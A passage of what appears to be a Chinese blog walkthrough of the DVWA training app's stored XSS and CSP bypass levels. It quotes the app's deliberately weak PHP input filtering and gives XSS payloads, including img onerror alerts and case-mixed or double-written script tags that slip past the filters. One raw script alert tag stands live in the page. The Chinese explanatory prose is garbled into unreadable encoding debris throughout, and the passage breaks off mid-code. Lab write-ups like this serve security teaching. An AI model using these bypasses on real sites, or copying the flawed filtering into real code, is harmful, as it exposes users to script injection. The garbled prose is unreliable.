<p>preg_replace() å‡½æ•°æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢ï¼Œâ€œ*â€ ä»£è¡¨ä¸€ä¸ªæˆ–å¤šä¸ªä»»æ„å­—ç¬¦ï¼Œâ€œiâ€ ä»£è¡¨ä¸åŒºåˆ†å¤§å°å†™ã€‚ä¹Ÿå°±æ˜¯è¯´ â€œ&lt; script &gt;â€ æ ‡ç­¾åœ¨è¿™é‡Œè¢«å®Œå…¨è¿‡æ»¤äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡å…¶ä»–çš„æ ‡ç­¾ä¾‹å¦‚ imgã€body ç­‰æ ‡ç­¾çš„äº‹ä»¶æˆ–è€…iframe ç­‰æ ‡ç­¾çš„ src æ³¨å…¥ JS æ”»å‡»è„šæœ¬ã€‚</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span> = <span class="hljs-string">1</span> <span class="hljs-attr">onerror</span> = <span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>é€šè¿‡ä¸Šè¿°æ‰§è¡Œæˆ‘ä»¬ä¼šå‘ç°ï¼Œæ¯æ¬¡æ³¨å…¥payloadæ˜¯ä¸€æ¬¡æ€§çš„ï¼Œå…³é—­é¡µé¢å†æ¬¡è¿›å…¥æˆ‘ä»¬ä¼šå‘ç°ä¸ä¼šå†æ‰§è¡Œï¼Œè¿™ä¸åé¢çš„å­˜å‚¨å‹xssæœ€å¤§çš„åŒºåˆ«ã€‚</p>
<h2 id="xsså·²å­˜å‚¨"><a href="#xsså·²å­˜å‚¨" class="headerlink" title="xsså·²å­˜å‚¨"></a>xsså·²å­˜å‚¨</h2><p>XSSå­˜å‚¨å‹æ”»å‡»ï¼Œæ”»å‡»è€…äº‹å…ˆå°†æ¶æ„ä»£ç ä¸Šä¼ æˆ–å‚¨å­˜åˆ°æ¼æ´æœåŠ¡å™¨ä¸­ï¼Œåªè¦å—å®³è€…æµè§ˆåŒ…å«æ­¤æ¶æ„ä»£ç çš„é¡µé¢å°±ä¼šæ‰§è¡Œæ¶æ„ä»£ç ã€‚è¿™å°±æ„å‘³ç€åªè¦è®¿é—®äº†è¿™ä¸ªé¡µé¢çš„è®¿å®¢ï¼Œéƒ½æœ‰å¯èƒ½ä¼šæ‰§è¡Œè¿™æ®µæ¶æ„è„šæœ¬ï¼Œå› æ­¤å‚¨å­˜å‹XSSçš„å±å®³ä¼šæ›´å¤§ã€‚å› ä¸ºå­˜å‚¨å‹XSSçš„ä»£ç å­˜åœ¨äºç½‘é¡µçš„ä»£ç ä¸­ï¼Œå¯ä»¥è¯´æ˜¯æ°¸ä¹…å‹çš„ã€‚</p>
<p>å­˜å‚¨å‹ XSS ä¸€èˆ¬å‡ºç°åœ¨ç½‘ç«™ç•™è¨€ã€è¯„è®ºã€åšå®¢æ—¥å¿—ç­‰äº¤äº’å¤„ï¼Œæ¶æ„è„šæœ¬å­˜å‚¨åˆ°å®¢æˆ·ç«¯æˆ–è€…æœåŠ¡ç«¯çš„æ•°æ®åº“ä¸­ã€‚</p>
<h3 id="low-10"><a href="#low-10" class="headerlink" title="low"></a>low</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br><span class="hljs-comment">// trim(string,charlist)</span><br><span class="hljs-comment">/*å‡½æ•°ç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦ï¼Œé¢„å®šä¹‰å­—ç¬¦åŒ…æ‹¬ã€\tã€\nã€\x0Bã€\rä»¥åŠç©ºæ ¼ï¼Œå¯é€‰å‚æ•°charlistæ”¯æŒæ·»åŠ é¢å¤–éœ€è¦åˆ é™¤çš„å­—ç¬¦ã€‚*/</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br><span class="hljs-comment">// stripslashes(string)</span><br>å‡½æ•°åˆ é™¤å­—ç¬¦ä¸²ä¸­çš„åæ–œæ ã€‚<br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$message</span> );<br><span class="hljs-comment">// mysql_real_escape_string(string,connection)</span><br><span class="hljs-comment">//å‡½æ•°ä¼šå¯¹å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šç¬¦å·ï¼ˆ\x00ï¼Œ\nï¼Œ\rï¼Œ\ï¼Œâ€˜ï¼Œâ€œï¼Œ\x1aï¼‰è¿›è¡Œè½¬ä¹‰ã€‚</span><br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>å¯¹XSSæ–¹é¢æ²¡æœ‰åšè¿‡æ»¤ä¸æ£€æŸ¥ï¼Œè€Œä¸”æ•°æ®å°†è¢«å­˜å‚¨åˆ°æ•°æ®åº“ä¸­ï¼Œå› æ­¤å­˜åœ¨å­˜å‚¨å‹XSS</p>
<script>alert(1)</script>

<h2 id="medium-9"><a href="#medium-9" class="headerlink" title="medium"></a>medium</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br><span class="hljs-comment">// strip_tags() å‡½æ•°å‰¥å»å­—ç¬¦ä¸²ä¸­çš„HTMLã€XMLä»¥åŠPHPçš„æ ‡ç­¾ï¼Œä½†å…è®¸ä½¿ç”¨&lt;b&gt;æ ‡ç­¾</span><br><span class="hljs-comment">// addslashes() å‡½æ•°è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ï¼ˆå•å¼•å·ã€åŒå¼•å·ã€åæ–œæ ã€NULLï¼‰ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">strip_tags</span>( <span class="hljs-title function_ invoke__">addslashes</span>( <span class="hljs-variable">$message</span> ) );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>Messageå¤„ä½¿ç”¨äº†htmlspecialchars()å‡½æ•°ï¼Œå°†å­—ç¬¦å…¨éƒ¨è½¬ä¸ºäº†HTMLå®ä½“ï¼Œå› æ­¤Messageå¤„æ— æ³•ä½¿ç”¨XSSå½¢æˆæ”»å‡»ã€‚</p>
<p>nameå¤„åšäº†é•¿åº¦é™åˆ¶ï¼Œå› æ­¤è€ƒè™‘ä½¿ç”¨æŠ“åŒ…åœ¨BPä¸­ä¿®æ”¹nameçš„å€¼ï¼Œè¿˜æœ‰å°±æ˜¯ä»–ä¼šå°† <script> è½¬åŒ–ä¸ºç©ºï¼Œæ‰€æœ‰è€ƒè™‘ä½¿ç”¨åŒå†™æˆ–è€…å¤§å°å†™å»ç»•è¿‡ã€‚</p>
<p><img src="/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240131220939345.png" srcset="/img/loading.gif" lazyload alt="image-20240131220939345"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">SCript</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">SCRIpt</span>&gt;</span><br><br>&lt;scr<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>ipt&gt;alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h2 id="high-7"><a href="#high-7" class="headerlink" title="high"></a>high</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br> <br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">strip_tags</span>( <span class="hljs-title function_ invoke__">addslashes</span>( <span class="hljs-variable">$message</span> ) );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );<br> <br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br> <br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br> <br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br> <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>Nmaeå¤„å¯¹ <script> åšäº†é™åˆ¶ï¼Œå„ç§å½¢å¼çš„ <script> éƒ½ä¸è¡Œäº†ï¼Œè€ƒè™‘ä½¿ç”¨å…¶ä»–çš„æ ‡ç­¾ï¼Œæ¯”å¦‚img</p>
<p>æ”¹nameä½¿ç”¨BP</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p><img src="/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240131223550962.png" srcset="/img/loading.gif" lazyload alt="image-20240131223550962"></p>
<h2 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h2><p>å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰ç”¨äºå®šä¹‰è„šæœ¬å’Œå…¶ä»–èµ„æºå¯ä»¥ä»ä½•å¤„åŠ è½½æˆ–æ‰§è¡Œï¼Œæœ¬æ¨¡å—å°†æŒ‡å¯¼æ‚¨æ ¹æ®å¼€å‘äººå‘˜çŠ¯ä¸‹çš„å¸¸è§é”™è¯¯æ¥ç»•è¿‡è¯¥ç­–ç•¥ã€‚</p>
<p>CSP:ä¸ºäº†ç¼“è§£å¾ˆå¤§ä¸€éƒ¨åˆ†æ½œåœ¨çš„è·¨ç«™è„šæœ¬(XSS) é—®é¢˜ï¼Œæµè§ˆå™¨çš„æ‰©å±•ç¨‹åºç³»ç»Ÿå¼•å…¥äº†å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰çš„ä¸€èˆ¬æ¦‚å¿µã€‚é€šè¿‡å¼•å…¥ä¸€äº›ç›¸å½“ä¸¥æ ¼çš„ç­–ç•¥ä½¿æ‰©å±•ç¨‹åºåœ¨é»˜è®¤æƒ…å†µä¸‹æ›´åŠ å®‰å…¨ï¼Œå¼€å‘è€…å¯ä»¥åˆ›å»ºå¹¶å¼ºåˆ¶åº”ç”¨ä¸€äº›è§„åˆ™ï¼Œç®¡ç†ç½‘ç«™å…è®¸åŠ è½½çš„å†…å®¹ã€‚</p>
<h3 id="low-11"><a href="#low-11" class="headerlink" title="low"></a>low</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$headerCSP</span> = <span class="hljs-string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; https://pastebin.com hastebin.com example.com code.jquery.com https://ssl.google-analytics.com ;&quot;</span>; <span class="hljs-comment">// allows js from self, pastebin.com, hastebin.com, jquery and google analytics.</span><br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-variable">$headerCSP</span>);<br><br><span class="hljs-comment"># These might work if you can&#x27;t create your own for some reason</span><br><span class="hljs-comment"># https://pastebin.com/raw/R570EE00</span><br><span class="hljs-comment"># https://hastebin.com/raw/ohulaquzex</span><br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>])) &#123;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&quot;</span><br><span class="hljs-string">    &lt;script src=&#x27;&quot;</span> . <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>] . <span class="hljs-string">&quot;&#x27;&gt;&lt;/script&gt;</span><br><span class="hljs-string">&quot;</span>;<br>&#125;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span><br><span class="hljs-string">    &lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt;</span><br><span class="hljs-string">    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯è¯´æºç å¯¹ HTTP å¤´å®šä¹‰äº† CSP æ ‡ç­¾ï¼Œä»è€Œå®šä¹‰äº†å¯ä»¥æ¥å—å¤–éƒ¨ JavaScript èµ„æºçš„ç™½åå•ï¼Œé€šè¿‡æŠ“åŒ…ä¹Ÿå¯ä»¥çŸ¥é“æ˜¯å“ªäº›ç½‘ç«™ã€‚</p>
<h3 id="medium-10"><a href="#medium-10" class="headerlink" title="medium"></a>medium</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$headerCSP</span> = <span class="hljs-string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;;&quot;</span>;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-variable">$headerCSP</span>);<br><br><span class="hljs-comment">// Disable XSS protections so that inline alert boxes will work</span><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment"># &lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;</span><br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>])) &#123;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&quot;</span><br><span class="hljs-string">    &quot;</span> . <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>] . <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>&#125;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;form name=&quot;csp&quot; 